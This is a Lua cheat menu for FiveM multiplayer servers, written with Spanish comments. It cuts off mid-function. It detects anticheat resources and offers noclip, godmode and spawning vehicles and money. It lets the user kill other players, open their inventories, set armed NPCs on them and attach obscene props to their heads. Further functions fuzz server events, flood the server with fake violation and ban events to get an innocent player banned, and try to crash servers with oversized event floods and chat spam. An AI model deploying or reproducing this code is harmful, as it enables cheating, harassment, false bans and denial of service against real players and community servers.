--[[
    SENTEX MODULES v3.7 - Completo para Susano
    Basado en el menú original con todas las funciones.
]]

local _r = math.random
local _w = Citizen.Wait

local function Notify(msg)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(msg)
    DrawNotification(false, false)
end

-- ============================================================================
--                          DETECCIÓN DE ANTICHEAT
-- ============================================================================
local _acDetected = false
local _acList = {}

local _acDB = {
    {"WaveShield", {"waveshield", "ws_core", "ws_anticheat"}},
    {"FiveGuard", {"fiveguard", "fg_anticheat"}},
    {"ElectronAC", {"electronac", "electron_", "eac"}},
    {"Likizao", {"likizao", "lkz", "likizao_anticheat"}},
    {"Eulen", {"eulen", "eulencheat", "eulen_anticheat"}},
    {"RedEngine", {"redengine", "red_anticheat", "reac"}},
    {"InfinityAC", {"infinityac", "infinity_", "iac"}},
    {"PhoenixAC", {"phoenixac", "phoenix_anticheat"}},
    {"VexAC", {"vexac", "vex_anticheat"}},
    {"NexusAC", {"nexusac", "nexus_anticheat"}},
    {"ReaperV4", {"reaperv4", "reaper_ac"}},
    {"Eagle", {"eagle", "ec_ac", "ec-ac"}},
    {"FiniAC", {"finiac", "fini_ac"}},
}

local function _scanAC()
    local found = {}
    local ok, num = pcall(GetNumResources)
    if ok then
        for i = 0, num - 1 do
            local res = GetResourceByFindIndex(i)
            if res then
                local name = string.lower(res)
                for _, ac in ipairs(_acDB) do
                    for _, p in ipairs(ac[2]) do
                        if name:find(p, 1, true) then
                            local startPos = name:find(p, 1, true)
                            if startPos == 1 or name:sub(startPos-1, startPos-1) == '_' then
                                found[ac[1]] = true
                            end
                        end
                    end
                end
            end
            _w(0)
        end
    end
    if next(found) then
        _acDetected = true
        _acList = {}
        for name,_ in pairs(found) do table.insert(_acList, name) end
        Notify("~r~⚠️ Anticheat detectado: ~y~"..table.concat(_acList,", ").."~s~")
        Notify("~r~ADVERTENCIA: Usa bajo tu responsabilidad (entorno de pruebas).")
    else
        _acDetected = false
        _acList = {}
        Notify("~g~No se detectaron anticheats conocidos")
    end
end

-- ============================================================================
--                               ACCIONES SELF
-- ============================================================================
local function _curar()
    local p = PlayerPedId()
    SetEntityHealth(p, GetEntityMaxHealth(p))
    SetPedArmour(p, 100)
    ClearPedBloodDamage(p)
    Notify("~g~Salud y armadura restauradas")
end

local function _revivirESX()
    TriggerEvent('esx_ambulancejob:revive')
    Notify("~g~Reviviendo (ESX)")
end

local function _revivirQB()
    local p = PlayerPedId()
    if IsPedDeadOrDying(p, true) then
        TriggerEvent('hospital:client:Revive')
        _w(100)
        if IsPedDeadOrDying(p, true) then
            TriggerServerEvent('hospital:server:RevivePlayer', GetPlayerServerId(PlayerId()))
        end
        _w(100)
        if exports['qbx_medical'] then
            pcall(function() exports['qbx_medical']:RevivePlayer() end)
        end
        Notify("~g~Intentando revivir (QB/QC)")
    else
        Notify("~r~No estás muerto")
    end
end

-- NOCLIP (se activa con toggle)
local _noclipActivo = false
local function _toggleNoclip(val)
    _noclipActivo = val
    if val then
        Notify("~b~Noclip ACTIVADO")
        -- El hilo del noclip debería estar en core.lua o aquí mismo. Lo pondremos aquí.
        Citizen.CreateThread(function()
            while _noclipActivo do
                local p = PlayerPedId()
                local ent = (GetVehiclePedIsIn(p,false)~=0 and GetVehiclePedIsIn(p,false)) or p
                SetEntityCollision(ent, false, false)
                SetEntityInvincible(p, true)
                FreezeEntityPosition(ent, false)
                SetEntityVelocity(ent, 0,0,0)
                local mx,my,mz = 0,0,0
                if IsControlPressed(0, 32) then my=my+1 end
                if IsControlPressed(0, 33) then my=my-1 end
                if IsControlPressed(0, 34) then mx=mx+1 end
                if IsControlPressed(0, 35) then mx=mx-1 end
                if IsControlPressed(0, 22) then mz=mz+1 end
                if IsControlPressed(0, 36) then mz=mz-1 end
                local speed = 5.0
                if IsControlPressed(0, 21) then speed = speed * 3 end
                if mx~=0 or my~=0 or mz~=0 then
                    local len = math.sqrt(mx^2+my^2+mz^2)
                    if len>0 then mx,my,mz = mx/len, my/len, mz/len end
                    local rot = GetGameplayCamRot(2)
                    local pitch = math.rad(rot.x)
                    local yaw = math.rad(rot.z)
                    local cosP, sinP = math.cos(pitch), math.sin(pitch)
                    local cosY, sinY = math.cos(yaw), math.sin(yaw)
                    local fwd = vector3(-sinY*cosP, cosY*cosP, sinP)
                    local right = vector3(-cosY, -sinY, 0)
                    local up = vector3(0,0,1)
                    local delta = (fwd*my) + (right*mx) + (up*mz)
                    SetEntityCoords(ent, GetEntityCoords(ent) + delta*speed, false, false, false, false)
                end
                _w(0)
            end
        end)
    else
        Notify("~r~Noclip DESACTIVADO")
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        local rayHandle = StartShapeTestRay(coords.x, coords.y, coords.z+5.0, coords.x, coords.y, coords.z-10.0, -1, ped, 0)
        local _, hit, hitPos = GetShapeTestResult(rayHandle)
        if hit then
            SetEntityCoords(ped, coords.x, coords.y, hitPos.z+0.5, false, false, false, false)
        end
    end
end

-- ============================================================================
--                             ACCIONES VEHÍCULO
-- ============================================================================
local function _repararVeh()
    local v = GetVehiclePedIsIn(PlayerPedId(), false)
    if v and v ~= 0 then
        SetVehicleFixed(v)
        SetVehicleDirtLevel(v, 0.0)
        Notify("~g~Vehículo reparado y limpiado")
    else
        Notify("~r~No estás en un vehículo")
    end
end

local function _tuneVehicleMax()
    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
    if veh and veh ~= 0 then
        SetVehicleModKit(veh, 0)
        for i = 0, 49 do
            local numMods = GetNumVehicleMods(veh, i)
            if numMods > 0 then
                SetVehicleMod(veh, i, numMods - 1, false)
            end
        end
        ToggleVehicleMod(veh, 18, true)
        SetVehicleTyresCanBurst(veh, false)
        SetVehicleWindowTint(veh, 1)
        SetVehicleColours(veh, 120, 120)
        SetVehicleNeonLightsColour(veh, 0, 255, 255)
        SetVehicleNeonLightEnabled(veh, 0, true)
        SetVehicleNeonLightEnabled(veh, 1, true)
        SetVehicleNeonLightEnabled(veh, 2, true)
        SetVehicleNeonLightEnabled(veh, 3, true)
        Notify("~g~Vehículo tuneado al máximo")
    else
        Notify("~r~No estás en un vehículo")
    end
end

local _shiftBoostActive = false
local function _toggleShiftBoost(val)
    _shiftBoostActive = val
    if val then
        Notify("~g~Shift Boost ACTIVADO (mantén SHIFT)")
    else
        Notify("~r~Shift Boost DESACTIVADO")
    end
end

Citizen.CreateThread(function()
    while true do
        if _shiftBoostActive then
            local ped = PlayerPedId()
            local veh = GetVehiclePedIsIn(ped, false)
            if veh ~= 0 and IsControlPressed(0, 21) then
                local speed = GetEntitySpeed(veh) * 3.6
                if speed < 250 then
                    local fwd = GetEntityForwardVector(veh)
                    ApplyForceToEntity(veh, 1, fwd.x * 20.0, fwd.y * 20.0, fwd.z * 20.0, 0,0,0, 0, false, true, true, false, true)
                end
            end
        end
        Citizen.Wait(0)
    end
end)

local function _flipVeh()
    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
    if veh and veh ~= 0 then
        local rot = GetEntityRotation(veh)
        SetEntityRotation(veh, rot.x, rot.y, rot.z + 180.0, 2, true)
        Notify("~g~Vehículo volteado")
    else
        Notify("~r~No estás en un vehículo")
    end
end

local function _limpiarVeh()
    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
    if veh and veh ~= 0 then
        SetVehicleDirtLevel(veh, 0.0)
        Notify("~g~Vehículo limpiado")
    else
        Notify("~r~No estás en un vehículo")
    end
end

local function _spawnVeh()
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "", "Modelo:", "", "", "", 30)
    while UpdateOnscreenKeyboard() == 0 do _w(0) end
    local res = GetOnscreenKeyboardResult()
    if res and res ~= "" then
        local model = res:lower()
        if IsModelValid(model) then
            RequestModel(model)
            while not HasModelLoaded(model) do _w(10) end
            local p = PlayerPedId()
            local coords = GetEntityCoords(p)
            local heading = GetEntityHeading(p)
            local veh = CreateVehicle(model, coords.x+2.0, coords.y+2.0, coords.z, heading, true, false)
            SetVehicleOnGroundProperly(veh)
            SetModelAsNoLongerNeeded(model)
            Notify("~g~Vehículo ~b~"..model.." ~g~spawneado")
        else
            Notify("~r~Modelo inválido: "..model)
        end
    end
end

-- Cargar y lanzar vehículo (funciones breves)
local _vehCargado = nil
local _cargando = false
local function _rotToDir(rot)
    local adj = vec3((math.pi/180)*rot.x, (math.pi/180)*rot.y, (math.pi/180)*rot.z)
    return vec3(-math.sin(adj.z)*math.abs(math.cos(adj.x)), math.cos(adj.z)*math.abs(math.cos(adj.x)), math.sin(adj.x))
end
local function _cargarVeh()
    local p = PlayerPedId()
    local camPos = GetGameplayCamCoord()
    local camRot = GetGameplayCamRot(2)
    local dir = _rotToDir(camRot)
    local dest = vec3(camPos.x+dir.x*10.0, camPos.y+dir.y*10.0, camPos.z+dir.z*10.0)
    local ray = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, p, 0)
    local _, hit, _, _, ent = GetShapeTestResult(ray)
    if hit==1 and GetEntityType(ent)==2 then
        if _cargando then Notify("~r~Ya estás cargando un vehículo") return end
        _vehCargado = ent
        _cargando = true
        if not NetworkHasControlOfEntity(_vehCargado) then
            NetworkRequestControlOfEntity(_vehCargado)
            local t = 0
            while not NetworkHasControlOfEntity(_vehCargado) and t < 20 do _w(50) t=t+1 end
        end
        FreezeEntityPosition(_vehCargado, true)
        AttachEntityToEntity(_vehCargado, p, GetPedBoneIndex(p,60309), 1.0,0.5,0.0,0.0,0.0,0.0, true, true, false, false, 1, true)
        RequestAnimDict('anim@mp_rollarcoaster')
        while not HasAnimDictLoaded('anim@mp_rollarcoaster') do _w(10) end
        TaskPlayAnim(p, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
        Notify("~g~Vehículo cargado")
    else
        Notify("~r~No estás mirando a ningún vehículo")
    end
end
local function _lanzarVeh()
    if not _cargando or not _vehCargado then
        Notify("~r~No tienes ningún vehículo cargado")
        return
    end
    local p = PlayerPedId()
    local camRot = GetGameplayCamRot(2)
    local dir = _rotToDir(camRot)
    DetachEntity(_vehCargado, true, true)
    FreezeEntityPosition(_vehCargado, false)
    local force = 50.0
    ApplyForceToEntity(_vehCargado, 1, dir.x*force, dir.y*force, dir.z*force, 0.0,0.0,0.0, 0, false, true, true, false, true)
    ClearPedTasks(p)
    Notify("~y~Vehículo lanzado con fuerza")
    _vehCargado = nil
    _cargando = false
end

-- Enganchar todos los vehículos cercanos
local _vehiclesAttached = {}
local function _attachAllNearbyVehicles()
    local ped = PlayerPedId()
    local myVeh = GetVehiclePedIsIn(ped, false)
    if myVeh == 0 then Notify("~r~Debes estar en un vehículo") return end
    local coords = GetEntityCoords(myVeh)
    local pool = GetGamePool("CVehicle")
    local count = 0
    for _, v in ipairs(pool) do
        if v ~= myVeh and not _vehiclesAttached[v] then
            if #(coords - GetEntityCoords(v)) < 100.0 then
                if not NetworkHasControlOfEntity(v) then
                    NetworkRequestControlOfEntity(v)
                    local t=0
                    while not NetworkHasControlOfEntity(v) and t<20 do _w(50) t=t+1 end
                end
                AttachEntityToEntity(v, myVeh, 0, 0.0, -2.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                table.insert(_vehiclesAttached, v)
                count = count + 1
            end
        end
    end
    if count > 0 then Notify("~g~Enganchados "..count.." vehículos") else Notify("~r~No hay vehículos cercanos") end
end
local function _detachAllVehicles()
    for _, v in ipairs(_vehiclesAttached) do
        if DoesEntityExist(v) then DetachEntity(v, true, false) end
    end
    _vehiclesAttached = {}
    Notify("~r~Todos los vehículos desenganchados")
end

-- ============================================================================
--                         ACCIONES JUGADORES (LISTA)
-- ============================================================================
local function _listaJugadores()
    local list = {}
    for i=0,255 do
        if NetworkIsPlayerActive(i) then
            local ped = GetPlayerPed(i)
            if ped and ped~=0 then
                table.insert(list, i)
            end
        end
    end
    return list
end
local function _nombreJugador(pid)
    local ok, name = pcall(function() return GetPlayerName(pid) end)
    if ok and name then return name end
    return "Jugador "..pid
end

-- Acciones sobre jugador: revivir, matar, teleportar, seguir, etc.
local function _revivirJugador(pid)
    local targetPed = GetPlayerPed(pid)
    if not targetPed or targetPed == 0 then Notify("~r~Jugador no encontrado") return end
    TriggerEvent('esx_ambulancejob:revive', pid)
    TriggerEvent('hospital:client:Revive', pid)
    TriggerServerEvent('hospital:server:RevivePlayer', GetPlayerServerId(pid))
    if exports['qbx_medical'] then pcall(function() exports['qbx_medical']:RevivePlayer(pid) end) end
    TriggerServerEvent('qb-hospital:server:RevivePlayer', GetPlayerServerId(pid))
    _w(500)
    if IsPedDeadOrDying(targetPed, true) then
        SetEntityHealth(targetPed, GetEntityMaxHealth(targetPed))
        ClearPedBloodDamage(targetPed)
        Notify("~g~Revivido por método directo")
    else
        Notify("~g~Intento de revivir completado")
    end
end
local function _matarJugador(tgt)
    local tgtPed = GetPlayerPed(tgt)
    if tgtPed and tgtPed~=0 then
        SetEntityHealth(tgtPed, 0)
        Notify("~r~Jugador eliminado")
    end
end
local function _teleportTo(tgt)
    local tgtPed = GetPlayerPed(tgt)
    if tgtPed and tgtPed~=0 then
        local coord = GetEntityCoords(tgtPed)
        local p = PlayerPedId()
        DoScreenFadeOut(500)
        _w(500)
        SetEntityCoords(p, coord.x, coord.y, coord.z+0.5, false, false, false, false)
        _w(100)
        DoScreenFadeIn(500)
        Notify("~g~Teletransportado")
    end
end
local function _spectatePlayer(pid)
    local targetPed = GetPlayerPed(pid)
    if targetPed and targetPed ~= 0 then
        NetworkSetInSpectatorMode(true, targetPed)
        Notify("~b~Espectando a " .. _nombreJugador(pid))
    else
        Notify("~r~Jugador no encontrado")
    end
end
local _siguienteJugador = nil
local function _followPlayer(pid)
    if _siguienteJugador == pid then
        _siguienteJugador = nil
        SetPlayerFollowing(PlayerId(), 0)
        Notify("~y~Dejaste de seguir")
    else
        _siguienteJugador = pid
        Notify("~y~Siguiendo jugador")
    end
end
local function _abrirInventario(tgt)
    local sid = GetPlayerServerId(tgt)
    if not sid then Notify("~r~No se pudo obtener Server ID") return end
    TriggerEvent('ox_inventory:openInventory', 'otherplayer', sid)
    TriggerServerEvent('esx_inventory:openInventory', 'otherplayer', sid)
    TriggerServerEvent('qb-inventory:server:OpenInventory', 'player', sid)
    TriggerEvent('inventory:client:openInventory', tgt)
    Notify("~g~Intentando abrir inventario del jugador")
end
local function _engancharVehCercano(tgt)
    local tgtPed = GetPlayerPed(tgt)
    if not tgtPed or tgtPed == 0 then Notify("~r~Jugador no encontrado") return end
    local pos = GetEntityCoords(tgtPed)
    local pool = GetGamePool("CVehicle")
    local closestVeh = nil
    local closestDist = 30.0
    for _, v in ipairs(pool) do
        local vPos = GetEntityCoords(v)
        local dist = #(pos - vPos)
        if dist < closestDist and v ~= GetVehiclePedIsIn(tgtPed, false) then
            closestDist = dist
            closestVeh = v
        end
    end
    if closestVeh then
        if not NetworkHasControlOfEntity(closestVeh) then
            NetworkRequestControlOfEntity(closestVeh)
            local t=0
            while not NetworkHasControlOfEntity(closestVeh) and t<20 do _w(50) t=t+1 end
        end
        AttachEntityToEntity(closestVeh, tgtPed, GetPedBoneIndex(tgtPed, 60309), 0.0,0.0,0.0,0.0,0.0,0.0, true, true, false, false, 2, true)
        Notify("~g~Vehículo enganchado al jugador")
    else
        Notify("~r~No hay vehículos cerca del jugador")
    end
end
local function _spawnNPCs(targetPid, cantidad)
    cantidad = cantidad or _r(3, 6)
    local targetPed = GetPlayerPed(targetPid)
    if not targetPed or targetPed == 0 then Notify("~r~Jugador no encontrado") return end
    local targetCoords = GetEntityCoords(targetPed)
    local modelos = {"a_m_y_hipster_01", "a_m_y_skater_01", "a_m_y_runner_01", "a_m_y_beach_01", "a_m_y_cyclist_01", "a_m_y_business_01", "a_m_y_breakdance_01", "a_m_y_roadcyc_01"}
    Notify("~r~Spawneando "..cantidad.." NPCs hostiles (modo sigiloso)")
    Citizen.CreateThread(function()
        for i = 1, cantidad do
            local model = modelos[_r(#modelos)]
            RequestModel(model)
            local timeout = 0
            while not HasModelLoaded(model) and timeout < 100 do _w(10) timeout=timeout+1 end
            if not HasModelLoaded(model) then Notify("~r~Error cargando modelo") return end
            local angle = math.rad(_r(0,360))
            local dist = _r(8,20)
            local x = targetCoords.x + math.cos(angle)*dist
            local y = targetCoords.y + math.sin(angle)*dist
            local z = targetCoords.z
            local npc = CreatePed(0, model, x, y, z, _r(0,360), true, false)
            if npc and npc ~= 0 then
                Citizen.Wait(_r(100,300))
                NetworkRegisterEntityAsNetworked(npc)
                SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(npc), true)
                SetEntityAsMissionEntity(npc, true, true)
                SetEntityInvincible(npc, false)
                SetPedCombatAttributes(npc, 0, true)
                SetPedCombatAttributes(npc, 1, true)
                SetPedCombatAttributes(npc, 2, true)
                SetPedCombatAbility(npc, 100)
                SetPedCombatMovement(npc, 2)
                SetPedCombatRange(npc, 2)
                SetPedAccuracy(npc, 85)
                SetPedArmour(npc, 100)
                SetPedCanRagdoll(npc, true)
                SetPedFleeAttributes(npc, 0, false)
                GiveWeaponToPed(npc, GetHashKey("WEAPON_ASSAULTRIFLE"), 999, true, true)
                SetPedInfiniteAmmo(npc, true)
                SetEntityHealth(npc, 200)
                TaskCombatPed(npc, targetPed, 0, 16)
                table.insert(_spawnedNPCs, npc)
            end
            SetModelAsNoLongerNeeded(model)
            Citizen.Wait(_r(200,800))
        end
        Notify("~r~"..cantidad.." NPCs hostiles atacando a ".._nombreJugador(targetPid))
    end)
end
local _spawnedNPCs = {}

-- ============================================================================
--                             DILDO PERSISTENTE
-- ============================================================================
local _attachedDildos = {}
local function _attachDildoToPlayer(pid)
    local targetPed = GetPlayerPed(pid)
    if not targetPed or targetPed == 0 then
        Notify("~r~Jugador no encontrado")
        return
    end
    local modelosDildo = {"prop_cs_dildo_01", "prop_dildo_01", "prop_dildo_02", "prop_dildo_03"}
    local modelHash = nil
    for _, modelo in ipairs(modelosDildo) do
        local hash = GetHashKey(modelo)
        RequestModel(hash)
        local timeout = 0
        while not HasModelLoaded(hash) and timeout < 30 do
            _w(10)
            timeout = timeout + 1
        end
        if HasModelLoaded(hash) then
            modelHash = hash
            break
        end
        SetModelAsNoLongerNeeded(hash)
    end
    if not modelHash then
        Notify("~r~No se pudo cargar ningún modelo de dildo")
        return
    end
    local coords = GetEntityCoords(targetPed)
    local dildo = CreateObject(modelHash, coords.x, coords.y, coords.z, true, true, false)
    if not dildo or dildo == 0 then
        Notify("~r~Error al crear el objeto")
        SetModelAsNoLongerNeeded(modelHash)
        return
    end
    if not NetworkHasControlOfEntity(dildo) then
        NetworkRequestControlOfEntity(dildo)
        local t = 0
        while not NetworkHasControlOfEntity(dildo) and t < 20 do _w(50) t=t+1 end
    end
    NetworkRegisterEntityAsNetworked(dildo)
    local netId = NetworkGetNetworkIdFromEntity(dildo)
    SetNetworkIdExistsOnAllMachines(netId, true)
    SetNetworkIdCanMigrate(netId, false)
    SetEntityAsMissionEntity(dildo, true, true)
    SetEntityPersistent(dildo, true)
    SetEntityLoadCollisionFlag(dildo, true)
    SetEntityInvincible(dildo, true)
    SetEntityProofs(dildo, true, true, true, true, true, false, false, true)
    SetEntityCollision(dildo, false, false)
    FreezeEntityPosition(dildo, false)
    local boneIndex = GetPedBoneIndex(targetPed, 0x796e) -- SKEL_HEAD
    if boneIndex == -1 then boneIndex = GetPedBoneIndex(targetPed, 0x322) end
    local offset = vector3(0.22, 0.0, 0.03)
    local rot = vector3(-90.0, 0.0, 0.0)
    AttachEntityToEntity(dildo, targetPed, boneIndex, offset.x, offset.y, offset.z, rot.x, rot.y, rot.z, true, true, false, true, 2, true)
    _attachedDildos[dildo] = {
        ped = targetPed,
        model = modelHash,
        offset = offset,
        rot = rot,
        bone = boneIndex,
        playerId = pid
    }
    SetModelAsNoLongerNeeded(modelHash)
    Notify("~p~Le has enganchado un nepe en la cara a " .. _nombreJugador(pid) .. " (persistente)")
end

-- Hilo de persistencia del dildo
Citizen.CreateThread(function()
    while true do
        _w(1000)
        for dildo, data in pairs(_attachedDildos) do
            local pedExists = DoesEntityExist(data.ped) and not IsPedDeadOrDying(data.ped, true)
            local dildoExists = DoesEntityExist(dildo)
            if not pedExists then
                if dildoExists then DeleteEntity(dildo) end
                _attachedDildos[dildo] = nil
                Notify("~y~El nepe se desenganchó porque el jugador ya no está disponible")
            elseif not dildoExists then
                local newDildo = CreateObject(data.model, 0,0,0, true, true, false)
                if newDildo and newDildo ~= 0 then
                    NetworkRegisterEntityAsNetworked(newDildo)
                    SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(newDildo), true)
                    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(newDildo), false)
                    SetEntityAsMissionEntity(newDildo, true, true)
                    SetEntityPersistent(newDildo, true)
                    SetEntityLoadCollisionFlag(newDildo, true)
                    SetEntityInvincible(newDildo, true)
                    SetEntityProofs(newDildo, true, true, true, true, true, false, false, true)
                    SetEntityCollision(newDildo, false, false)
                    FreezeEntityPosition(newDildo, false)
                    AttachEntityToEntity(newDildo, data.ped, data.bone, data.offset.x, data.offset.y, data.offset.z, data.rot.x, data.rot.y, data.rot.z, true, true, false, true, 2, true)
                    _attachedDildos[newDildo] = data
                    _attachedDildos[dildo] = nil
                    Notify("~g~Nepe reenganchado automáticamente")
                else
                    _attachedDildos[dildo] = nil
                end
            else
                if not IsEntityAMissionEntity(dildo) then SetEntityAsMissionEntity(dildo, true, true) end
                if not IsEntityPersistent(dildo) then SetEntityPersistent(dildo, true) end
                local parent = GetEntityAttachedTo(dildo)
                if parent ~= data.ped then
                    DetachEntity(dildo, true, false)
                    AttachEntityToEntity(dildo, data.ped, data.bone, data.offset.x, data.offset.y, data.offset.z, data.rot.x, data.rot.y, data.rot.z, true, true, false, true, 2, true)
                end
            end
        end
    end
end)

-- ============================================================================
--                      EVENT HUNTER Y FRAMING
-- ============================================================================
local _fuzzingActive = false
local _eventsToFuzz = {
    "ban", "banplayer", "kick", "admin:ban", "staff:ban", "esx:ban", "qb-ban:player",
    "FiveGuard:Ban", "anticheat:ban", "giveMoney", "addMoney", "giveItem", "revive",
    "teleport", "spawnVehicle"
}
local function _startFuzzing()
    if _fuzzingActive then Notify("~r~Ya hay escaneo") return end
    _fuzzingActive = true
    Notify("~y~[Event Hunter] Fuzzing... 30s")
    for _, ev in ipairs(_eventsToFuzz) do
        for _, suffix in ipairs({"", "Player", "Command", "admin:", "staff:"}) do
            local fullEv = suffix .. ev
            pcall(function() TriggerServerEvent(fullEv, "test_".._r(1,999)) end)
            _w(50)
        end
        Notify("~b~Probado: "..ev)
    end
    _fuzzingActive = false
    Notify("~g~Fuzzing completado. Revisa la consola del servidor.")
end
local function _framingAttack(pid)
    local targetId = GetPlayerServerId(pid)
    if not targetId then Notify("~r~Error ID") return end
    local targetName = _nombreJugador(pid)
    Notify("~y~[Framing] Atacando a "..targetName)
    local logs = {"qb-log:server:CreateLog", "esx_logs:addLog", "anticheat:addViolation", "FiveGuard:SendLog"}
    for _, ev in ipairs(logs) do
        for _=1,3 do
            pcall(function() TriggerServerEvent(ev, "Suspicious activity from "..targetName, "HIGH", "CHEAT") end)
            _w(50)
        end
    end
    local violations = {"FiveGuard:AddViolation", "anticheat:report", "anticheat:godmode", "anticheat:teleport_hack"}
    for i=1,100 do
        local ev = violations[_r(#violations)]
        pcall(function() TriggerServerEvent(ev, targetId, "EXPLOIT", 100) end)
        _w(_r(5,20))
    end
    local bans = {"admin:ban", "staff:ban", "esx:ban", "qb-ban:player", "FiveGuard:Ban"}
    for _, ev in ipairs(bans) do
        pcall(function() TriggerServerEvent(ev, targetId, "Cheating detected") end)
        _w(30)
    end
    Notify("~r~Ataque completado. Si FiveGuard es vulnerable, el jugador será baneado.")
end

-- ============================================================================
--                      SERVER ATTACKS (PRUEBAS)
-- ============================================================================
local _lagEntidades = false
local _lagThread = nil
local function _startLagMachine()
    if _lagEntidades then
        _lagEntidades = false
        Notify("~r~Máquina de lag desactivada")
        return
    end
    _lagEntidades = true
    Notify("~y~Máquina de lag ACTIVADA (spawnea objetos cada frame) - solo para pruebas")
    _lagThread = Citizen.CreateThread(function()
        local counter = 0
        while _lagEntidades do
            local ped = PlayerPedId()
            local pos = GetEntityCoords(ped)
            for i = 1, 5 do
                local obj = CreateObject(GetHashKey("prop_roadcone01a"), pos.x + math.random(-20,20), pos.y + math.random(-20,20), pos.z, true, true, false)
                if obj and obj ~= 0 then
                    NetworkRegisterEntityAsNetworked(obj)
                    SetEntityAsMissionEntity(obj, true, true)
                    SetEntityCollision(obj, false, false)
                end
                counter = counter + 1
                if counter > 500 then
                    local pool = GetGamePool("CObject")
                    if #pool > 300 then
                        for _, o in ipairs(pool) do
                            if DoesEntityExist(o) and not IsEntityAPed(o) and not IsEntityAVehicle(o) then
                                DeleteEntity(o)
                            end
                            counter = 0
                        end
                    end
                end
                _w(0)
            end
            _w(0)
        end
    end)
end

local function _freezePlayer(pid)
    local targetPed = GetPlayerPed(pid)
    if targetPed and targetPed ~= 0 then
        FreezeEntityPosition(targetPed, true)
        Notify("~b~Jugador congelado (desync)")
        Citizen.SetTimeout(5000, function()
            if DoesEntityExist(targetPed) then FreezeEntityPosition(targetPed, false) end
            Notify("~b~Jugador descongelado")
        end)
    else
        Notify("~r~Jugador no encontrado")
    end
end

local function _crashAttempt(pid)
    local targetId = GetPlayerServerId(pid)
    if not targetId then Notify("~r~No se pudo obtener Server ID") return end
    Notify("~y~Intentando crash a ".._nombreJugador(pid).." (eventos maliciosos)")
    for i = 1, 200 do
        TriggerServerEvent("__internal_crash_"..tostring(i), string.rep("A", 500))
        TriggerServerEvent("chat:addMessage", {args = {string.rep("x", 500)}})
        if i % 10 == 0 then
            TriggerServerEvent("playerSpawn", string.rep("x", 250))
        end
        _w(0)
    end
    Notify("~r~Ataque de eventos completado. Si el jugador se desconecta, el servidor es vulnerable.")
end

local _desyncTarget = nil
local function _startDesync(pid)
    if _desyncTarget then
        _desyncTarget = nil
        Notify("~r~Desync detenido")
        return
    end
    _desyncTarget = pid
    Notify("~y~Desync activado contra ".._nombreJugador(pid))
    Citizen.CreateThread(function()
        while _desyncTarget == pid do
            local fakePos = vector3(math.random(-5000,5000), math.random(-5000,5000), math.random(-500,500))
            TriggerServerEvent("updateCoords", fakePos.x, fakePos.y, fakePos.z)
            TriggerServerEvent("playerSpawned", fakePos)
            TriggerServerEvent("esx:updatePosition", fakePos)
            _w(10)
        end
    end)
end

local function _testGodmodeExploit()
    Notify("~y~Probando bypass de godmode...")
    local ped = PlayerPedId()
    SetEntityInvincible(ped, true)
    TriggerServerEvent("anticheat:godmode", GetPlayerServerId(PlayerId()), true)
    Notify("~b~Godmode activado. Si FiveGuard no te banea en 10s, es vulnerable.")
    Citizen.SetTimeout(10000, function()
        SetEntityInvincible(ped, false)
        Notify("~r~Godmode desactivado (prueba finalizada)")
    end)
end

local function _testMoneyExploit()
    Notify("~y~Intentando exploit de dinero...")
    for i = 1, 100 do
        TriggerServerEvent("bank:deposit", 1000000)
        TriggerServerEvent("esx:giveMoney", 1000000)
        TriggerServerEvent("qb-phone:server:sendMoney", GetPlayerServerId(PlayerId()), 1000000)
        _w(0)
    end
    Notify("~r~Exploit de dinero ejecutado. Revisa logs del servidor.")
end

local _chatSpamActive = false
local function _startChatSpam()
    if _chatSpamActive then
        _chatSpamActive = false
        Notify("~r~Chat spam desactivado")
        return
    end
    _chatSpamActive = true
    Notify("~y~Chat spam ACTIVADO (inunda el chat)")
    Citizen.CreateThread(function()
        while _chatSpamActive do
            TriggerServerEvent("chat:addMessage", {args = {"[SPAM]", string.rep("A", 200)}})
            _w(0)
        end
    end)
end

-- ============================================================================
--                            MAP FUCKER
-- ============================================================================
local function _spawnStuntBlock()
    local ped = PlayerPedId()
    local pos = GetEntityCoords(ped)
    local handle = StartShapeTestRay(pos.x, pos.y, pos.z+100.0, pos.x, pos.y, pos.z-100.0, -1, ped, 0)
    local _, hit, hitPos = GetShapeTestResult(handle)
    local groundZ = hit and hitPos.z or pos.z
    local model = "stt_prop_stunt_bblock_huge_04"
    RequestModel(model)
    local timeout = 0
    while not HasModelLoaded(model) and timeout < 100 do _w(10) timeout=timeout+1 end
    if HasModelLoaded(model) then
        local prop = CreateObject(GetHashKey(model), pos.x, pos.y, groundZ+1.0, true, true, false)
        if prop and prop ~= 0 then
            NetworkRegisterEntityAsNetworked(prop)
            SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(prop), true)
            SetEntityAsMissionEntity(prop, true, true)
            FreezeEntityPosition(prop, true)
            Notify("~g~Bloque stunt gigante spawneado")
        else
            Notify("~r~Error al spawnear bloque stunt")
        end
    else
        Notify("~r~No se pudo cargar el modelo")
    end
    SetModelAsNoLongerNeeded(model)
end

local treeModels = {"prop_tree_olive_01", "prop_rio_del_01", "prop_tree_birch_04", "prop_tree_cedar_02"}
local _spawnedTrees = {}
local function _createForest()
    local ped = PlayerPedId()
    local center = GetEntityCoords(ped)
    local count = 150
    Notify("~y~Creando selva... (~w~"..count.." árboles~y~)")
    local created = 0
    for i = 1, count do
        local angle = math.rad(_r(0,360))
        local dist = _r(0, 80)
        local x = center.x + math.cos(angle)*dist
        local y = center.y + math.sin(angle)*dist
        local groundHandle = StartShapeTestRay(x, y, center.z+100.0, x, y, center.z-100.0, -1, ped, 0)
        local _, hit, hitPos = GetShapeTestResult(groundHandle)
        if hit then
            local modelName = treeModels[_r(#treeModels)]
            RequestModel(modelName)
            local timeout = 0
            while not HasModelLoaded(modelName) and timeout < 50 do _w(10) timeout=timeout+1 end
            if HasModelLoaded(modelName) then
